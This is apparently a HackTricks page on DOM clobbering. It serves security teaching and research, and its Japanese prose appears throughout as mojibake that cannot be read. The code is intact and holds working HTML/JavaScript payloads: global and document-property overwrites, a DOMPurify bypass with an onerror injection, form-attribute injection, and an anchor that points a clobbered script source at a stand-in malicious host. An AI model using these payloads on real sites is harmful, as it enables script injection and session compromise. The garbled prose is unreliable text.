# Dom Clobbering

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **åŸºæœ¬**

HTMLã‚¿ã‚°ã®å±æ€§**`id`**ã¨**`name`**ã‚’ä½¿ç”¨ã—ã¦ã€**JSã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆå†…ã«ã‚°ãƒ­ãƒ¼ãƒãƒ«å¤‰æ•°ã‚’ç”Ÿæˆã™ã‚‹**ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚
```html
<form id=x></form>
<script> console.log(typeof document.x) //[object HTMLFormElement] </script>
```
**ã®ã¿** ç‰¹å®šã®è¦ç´ ã¯ **nameå±æ€§** ã‚’ä½¿ç”¨ã—ã¦ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚’ã‚¯ãƒ©ãƒƒã‚·ãƒ£ãƒ¼ã§ãã¾ã™ã€‚ãã‚Œã‚‰ã¯: `embed`, `form`, `iframe`, `image`, `img` ãŠã‚ˆã³ `object` ã§ã™ã€‚

èˆˆå‘³æ·±ã„ã“ã¨ã«ã€**formè¦ç´ ** ã‚’ä½¿ç”¨ã—ã¦å¤‰æ•°ã‚’ **ã‚¯ãƒ©ãƒƒã‚·ãƒ£ãƒ¼** ã«ã™ã‚‹ã¨ã€è¦ç´ è‡ªä½“ã® **`toString`** å€¤ãŒå¾—ã‚‰ã‚Œã¾ã™: `[object HTMLFormElement]` ã§ã™ãŒã€**anchor** ã®å ´åˆã€**`toString`** ã¯ã‚¢ãƒ³ã‚«ãƒ¼ã® **`href`** ã«ãªã‚Šã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€**`a`** ã‚¿ã‚°ã‚’ä½¿ç”¨ã—ã¦ã‚¯ãƒ©ãƒƒã‚·ãƒ£ãƒ¼ã‚’è¡Œã†ã¨ã€**æ–‡å­—åˆ—ã¨ã—ã¦æ‰±ã‚ã‚Œã‚‹** ã¨ãã« **å€¤** ã‚’ **åˆ¶å¾¡** ã§ãã¾ã™:
```html
<a href="controlled string" id=x></a>
<script>
console.log(x);//controlled string
</script>
```
### é…åˆ—ã¨å±æ€§

é…åˆ—ã¨ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®å±æ€§ã‚’**ã‚¯ãƒ©ãƒƒã‚·ãƒ£ãƒ¼**ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™:
```html
<a id=x>
<a id=x name=y href=controlled>
<script>
console.log(x[1])//controlled
console.log(x.y)//controlled
</script>
```
**3ç•ªç›®ã®å±æ€§**ï¼ˆä¾‹ï¼šx.y.zï¼‰ã‚’ä¸Šæ›¸ãã™ã‚‹ã«ã¯ã€**`form`**ã‚’ä½¿ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š
```html
<form id=x name=y><input id=z value=controlled></form>
<form id=x></form>
<script>
alert(x.y.z.value)//controlled
</script>
```
å±æ€§ã‚’ã•ã‚‰ã«ã‚¯ãƒ©ãƒƒã‚­ãƒ³ã‚°ã™ã‚‹ã“ã¨ã¯**ã‚ˆã‚Šè¤‡é›‘ã§ã™ãŒã€ãã‚Œã§ã‚‚å¯èƒ½ã§ã™**ã€‚iframeã‚’ä½¿ç”¨ã—ã¾ã™:
```html
<iframe name=x srcdoc="<a id=y href=controlled></a>"></iframe>
<style>@import 'https://google.com';</style>
<script>alert(x.y)//controlled</script>
```
{% hint style="warning" %}
styleã‚¿ã‚°ã¯**iframeãŒãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã•ã‚Œã‚‹ã®ã«ååˆ†ãªæ™‚é–“ã‚’ä¸ãˆã‚‹ãŸã‚**ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ã“ã‚ŒãŒãªã„ã¨ã€**undefined**ã®ã‚¢ãƒ©ãƒ¼ãƒˆãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚
{% endhint %}

ã‚ˆã‚Šæ·±ã„å±æ€§ã‚’ã‚¯ãƒ©ãƒƒã‚·ãƒ£ãƒ¼ã™ã‚‹ã«ã¯ã€**htmlã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã‚’ä½¿ç”¨ã—ãŸiframes**ã‚’æ¬¡ã®ã‚ˆã†ã«ä½¿ç”¨ã§ãã¾ã™ï¼š
```html
<iframe name=a srcdoc="<iframe srcdoc='<iframe name=c srcdoc=<a/id=d&amp;amp;#x20;name=e&amp;amp;#x20;href=\controlled&amp;amp;gt;<a&amp;amp;#x20;id=d&amp;amp;gt; name=d>' name=b>"></iframe>
<style>@import 'https://google.com';</style>
<script>
alert(a.b.c.d.e)//controlled
</script>
```
### **ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ãƒã‚¤ãƒ‘ã‚¹**

ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ãŒ `document.getElementByID('x').attributes` ã®ã‚ˆã†ãªã‚‚ã®ã§ãƒãƒ¼ãƒ‰ã® **ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£** ã‚’ **ãƒ«ãƒ¼ãƒ—** ã—ã¦ã„ã‚‹å ´åˆã€å±æ€§ **`.attributes`** ã‚’ **ã‚¯ãƒ©ãƒƒã‚·ãƒ£ãƒ¼** ã—ã¦ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’ **å£Šã™** ã“ã¨ãŒã§ãã¾ã™ã€‚ **`tagName`** ã€ **`nodeName`** ã€ **`parentNode`** ãªã©ã®ä»–ã®DOMãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚‚ **ã‚¯ãƒ©ãƒƒã‚·ãƒ£ãƒ–ãƒ«** ã§ã™ã€‚
```html
<form id=x></form>
<form id=y>
<input name=nodeName>
</form>
<script>
console.log(document.getElementById('x').nodeName)//FORM
console.log(document.getElementById('y').nodeName)//[object HTMLInputElement]
</script>
```
## **`window.someObject`ã®ã‚¯ãƒ©ãƒƒãƒãƒ¼ãƒªãƒ³ã‚°**

JavaScriptã§ã¯ã€æ¬¡ã®ã‚ˆã†ãªã‚‚ã®ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒä¸€èˆ¬çš„ã§ã™ï¼š
```javascript
var someObject = window.someObject || {};
```
HTMLã‚’ãƒšãƒ¼ã‚¸ä¸Šã§æ“ä½œã™ã‚‹ã“ã¨ã§ã€`someObject`ã‚’DOMãƒãƒ¼ãƒ‰ã§ä¸Šæ›¸ãã™ã‚‹ã“ã¨ãŒã§ãã€æ½œåœ¨çš„ã«ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®è„†å¼±æ€§ã‚’å¼•ãèµ·ã“ã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ä¾‹ãˆã°ã€`someObject`ã‚’æ‚ªæ„ã®ã‚ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’æŒ‡ã™ã‚¢ãƒ³ã‚«ãƒ¼è¦ç´ ã«ç½®ãæ›ãˆã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```html
<a id=someObject href=//malicious-website.com/malicious.js></a>
```
è„†å¼±ãªã‚³ãƒ¼ãƒ‰ã®ä¾‹ã¨ã—ã¦ã¯ï¼š
```html
<script>
window.onload = function(){
let someObject = window.someObject || {};
let script = document.createElement('script');
script.src = someObject.url;
document.body.appendChild(script);
};
</script>
```
ã“ã®æ–¹æ³•ã¯ã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚½ãƒ¼ã‚¹ã‚’åˆ©ç”¨ã—ã¦ä¸è¦ãªã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚

**ãƒˆãƒªãƒƒã‚¯**: **`DOMPurify`** ã¯ **`cid:`** ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã¦ãŠã‚Šã€**äºŒé‡å¼•ç”¨ç¬¦ã‚’URLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã—ã¾ã›ã‚“**ã€‚ã“ã‚Œã¯ã€**å®Ÿè¡Œæ™‚ã«ãƒ‡ã‚³ãƒ¼ãƒ‰ã•ã‚Œã‚‹ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸäºŒé‡å¼•ç”¨ç¬¦ã‚’æ³¨å…¥ã§ãã‚‹**ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€**`<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`** ã®ã‚ˆã†ãªã‚‚ã®ã‚’æ³¨å…¥ã™ã‚‹ã¨ã€HTMLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸ `&quot;` ãŒ **å®Ÿè¡Œæ™‚ã«ãƒ‡ã‚³ãƒ¼ãƒ‰ã•ã‚Œ**ã€å±æ€§å€¤ã‹ã‚‰ **ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—** ã•ã‚Œã¦ **`onerror`** ã‚¤ãƒ™ãƒ³ãƒˆã‚’ **ä½œæˆ** ã—ã¾ã™ã€‚

åˆ¥ã®æŠ€è¡“ã¯ **`form`** è¦ç´ ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ç‰¹å®šã®ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã¯ã€æ–°ã—ãä½œæˆã•ã‚ŒãŸãƒ•ã‚©ãƒ¼ãƒ è¦ç´ ã®å±æ€§ã‚’æ¤œæŸ»ã—ã¦ã‚¯ãƒªãƒ¼ãƒ³ã‚¢ãƒƒãƒ—ã—ã¾ã™ã€‚ã—ã‹ã—ã€ãƒ•ã‚©ãƒ¼ãƒ å†…ã« `id=attributes` ã® `input` ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã§ã€å±æ€§ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’åŠ¹æœçš„ã«ä¸Šæ›¸ãã—ã€ã‚µãƒ‹ã‚¿ã‚¤ã‚¶ãƒ¼ãŒå®Ÿéš›ã®å±æ€§ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ããªã„ã‚ˆã†ã«ã—ã¾ã™ã€‚

ã“ã®ã‚¿ã‚¤ãƒ—ã®ã‚¯ãƒ©ãƒƒã‚­ãƒ³ã‚°ã®ä¾‹ã‚’[**ã“ã®CTFã®è§£èª¬ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™**](iframes-in-xss-and-csp.md#iframes-in-sop-2)ã€‚

## ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ã‚¯ãƒ©ãƒƒã‚­ãƒ³ã‚°

ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã«ã‚ˆã‚‹ã¨ã€DOMã‚¯ãƒ©ãƒƒã‚­ãƒ³ã‚°ã‚’ä½¿ç”¨ã—ã¦ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®å±æ€§ã‚’ä¸Šæ›¸ãã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ï¼š

> [Document](https://html.spec.whatwg.org/multipage/dom.html#document) ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã¯ [named properties](https://webidl.spec.whatwg.org/#dfn-support-named-properties) ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ã€‚[Document](https://html.spec.whatwg.org/multipage/dom.html#document) ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã® [supported property names](https://webidl.spec.whatwg.org/#dfn-supported-property-names) ã¯ã€æ¬¡ã®ã‚‚ã®ã§æ§‹æˆã•ã‚Œã¾ã™ã€‚[tree order](https://dom.spec.whatwg.org/#concept-tree-order) ã«å¾“ã„ã€å¾Œã®é‡è¤‡ã‚’ç„¡è¦–ã—ã€åŒã˜è¦ç´ ãŒä¸¡æ–¹ã‚’æä¾›ã™ã‚‹å ´åˆã¯ã€[id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) å±æ€§ã‹ã‚‰ã®å€¤ãŒåå‰å±æ€§ã‹ã‚‰ã®å€¤ã®å‰ã«æ¥ã¾ã™ï¼š
>
> \- ç©ºã§ãªã„åå‰ã‚³ãƒ³ãƒ†ãƒ³ãƒ„å±æ€§ã‚’æŒã¡ã€ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’ [root](https://dom.spec.whatwg.org/#concept-tree-root) ã¨ã™ã‚‹ [document tree](https://dom.spec.whatwg.org/#in-a-document-tree) ã«ã‚ã‚‹ã™ã¹ã¦ã® [exposed](https://html.spec.whatwg.org/multipage/dom.html#exposed) [embed](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element)ã€[form](https://html.spec.whatwg.org/multipage/forms.html#the-form-element)ã€[iframe](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element)ã€[img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element)ã€ãŠã‚ˆã³ [exposed](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) è¦ç´ ã®åå‰ã‚³ãƒ³ãƒ†ãƒ³ãƒ„å±æ€§ã®å€¤ï¼›
> \
> \- ç©ºã§ãªã„ [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) ã‚³ãƒ³ãƒ†ãƒ³ãƒ„å±æ€§ã‚’æŒã¡ã€ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’ [root](https://dom.spec.whatwg.org/#concept-tree-root) ã¨ã™ã‚‹ [document tree](https://dom.spec.whatwg.org/#in-a-document-tree) ã«ã‚ã‚‹ã™ã¹ã¦ã® [exposed](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) è¦ç´ ã® [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) ã‚³ãƒ³ãƒ†ãƒ³ãƒ„å±æ€§ã®å€¤ï¼›
> \
> \- ç©ºã§ãªã„ [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) ã‚³ãƒ³ãƒ†ãƒ³ãƒ„å±æ€§ã¨ç©ºã§ãªã„åå‰ã‚³ãƒ³ãƒ†ãƒ³ãƒ„å±æ€§ã®ä¸¡æ–¹ã‚’æŒã¡ã€ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’ [root](https://dom.spec.whatwg.org/#concept-tree-root) ã¨ã™ã‚‹ [document tree](https://dom.spec.whatwg.org/#in-a-document-tree) ã«ã‚ã‚‹ã™ã¹ã¦ã® [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) è¦ç´ ã® [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) ã‚³ãƒ³ãƒ†ãƒ³ãƒ„å±æ€§ã®å€¤ã€‚

ã“ã®æŠ€è¡“ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ä¸€èˆ¬çš„ã«ä½¿ç”¨ã•ã‚Œã‚‹ **`document.cookie`ã€`document.body`ã€`document.children`** ãªã©ã® **å€¤ã‚’ä¸Šæ›¸ã** ã—ãŸã‚Šã€`document.querySelector` ã®ã‚ˆã†ãª Document ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹å†…ã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä¸Šæ›¸ãã—ãŸã‚Šã§ãã¾ã™ã€‚
```javascript
document.write("<img name=cookie />")

document.cookie
<img name="cookie">

typeof(document.cookie)
'object'

//Something more sanitize friendly than a img tag
document.write("<form name=cookie><input id=toString></form>")

document.cookie
HTMLCollection(2)Â [img, form, cookie: img]

typeof(document.cookie)
'object
```
## è¦ç´ ãŒã‚¯ãƒ©ãƒƒã‚·ãƒ£ãƒ¼ã•ã‚ŒãŸå¾Œã®æ›¸ãè¾¼ã¿

**`document.getElementById()`** ã¨ **`document.querySelector()`** ã¸ã®å‘¼ã³å‡ºã—ã®çµæœã¯ã€åŒã˜ id å±æ€§ã‚’æŒã¤ `<html>` ã¾ãŸã¯ `<body>` ã‚¿ã‚°ã‚’æ³¨å…¥ã™ã‚‹ã“ã¨ã§å¤‰æ›´ã§ãã¾ã™ã€‚ã“ã‚Œã‚’è¡Œã†æ–¹æ³•ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š
```html
<div style="display:none" id="cdnDomain" class="x">test</div>
<p>
<html id="cdnDomain" class="x">clobbered</html>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
alert(document.querySelector('.x').innerText); // Clobbered
</script>
```
ã•ã‚‰ã«ã€ã“ã‚Œã‚‰ã®æ³¨å…¥ã•ã‚ŒãŸHTML/bodyã‚¿ã‚°ã‚’éš ã™ãŸã‚ã«ã‚¹ã‚¿ã‚¤ãƒ«ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€`innerText`å†…ã®ä»–ã®ãƒ†ã‚­ã‚¹ãƒˆã‹ã‚‰ã®å¹²æ¸‰ã‚’é˜²ãã€æ”»æ’ƒã®åŠ¹æœã‚’é«˜ã‚ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```html
<div style="display:none" id="cdnDomain">test</div>
<p>existing text</p>
<html id="cdnDomain">clobbered</html>
<style>
p{display:none;}
</style>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
SVGã«é–¢ã™ã‚‹èª¿æŸ»ã§ã¯ã€`<body>`ã‚¿ã‚°ã‚‚åŠ¹æœçš„ã«åˆ©ç”¨ã§ãã‚‹ã“ã¨ãŒæ˜ã‚‰ã‹ã«ãªã‚Šã¾ã—ãŸï¼š
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg><body id="cdnDomain">clobbered</body></svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
SVGå†…ã§HTMLã‚¿ã‚°ãŒChromeã‚„Firefoxãªã©ã®ãƒ–ãƒ©ã‚¦ã‚¶ã§æ©Ÿèƒ½ã™ã‚‹ãŸã‚ã«ã¯ã€`<foreignobject>`ã‚¿ã‚°ãŒå¿…è¦ã§ã™ï¼š
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg>
<foreignobject>
<html id="cdnDomain">clobbered</html>
</foreignobject>
</svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
## Clobbering Forms

**ãƒ•ã‚©ãƒ¼ãƒ å†…ã«æ–°ã—ã„ã‚¨ãƒ³ãƒˆãƒªã‚’è¿½åŠ ã™ã‚‹**ã“ã¨ã¯ã€**ã„ãã¤ã‹ã®ã‚¿ã‚°å†…ã«`form`å±æ€§ã‚’æŒ‡å®šã™ã‚‹**ã ã‘ã§å¯èƒ½ã§ã™ã€‚ã“ã‚Œã‚’ä½¿ç”¨ã—ã¦ã€**ãƒ•ã‚©ãƒ¼ãƒ å†…ã«æ–°ã—ã„å€¤ã‚’è¿½åŠ **ã—ãŸã‚Šã€æ–°ã—ã„**ãƒœã‚¿ãƒ³**ã‚’è¿½åŠ ã—ã¦**é€ä¿¡ã™ã‚‹**ã“ã¨ã‚‚ã§ãã¾ã™ï¼ˆã‚¯ãƒªãƒƒã‚¯ã‚¸ãƒ£ãƒƒã‚­ãƒ³ã‚°ã‚„ä¸€éƒ¨ã®`.click()` JSã‚³ãƒ¼ãƒ‰ã®æ‚ªç”¨ï¼‰ï¼š

{% code overflow="wrap" %}
```html
<!--Add a new attribute and a new button to send-->
<textarea form=id-other-form name=info>
";alert(1);//
</textarea>
<button form=id-other-form type="submit" formaction="/edit" formmethod="post">
Click to send!
</button>
```
{% endcode %}

* ãƒ•ã‚©ãƒ¼ãƒ å±æ€§ã®è©³ç´°ã«ã¤ã„ã¦ã¯[**ãƒœã‚¿ãƒ³ã‚’ç¢ºèªã—ã¦ãã ã•ã„**](https://www.w3schools.com/tags/tag\_button.asp)**ã€‚**

## å‚è€ƒæ–‡çŒ®

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
* [https://portswigger.net/web-security/dom-based/dom-clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
* Heyes, Gareth. ãƒãƒƒã‚«ãƒ¼ã®ãŸã‚ã®JavaScript: ãƒãƒƒã‚«ãƒ¼ã®ã‚ˆã†ã«è€ƒãˆã‚‹ã“ã¨ã‚’å­¦ã¶ã€‚

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
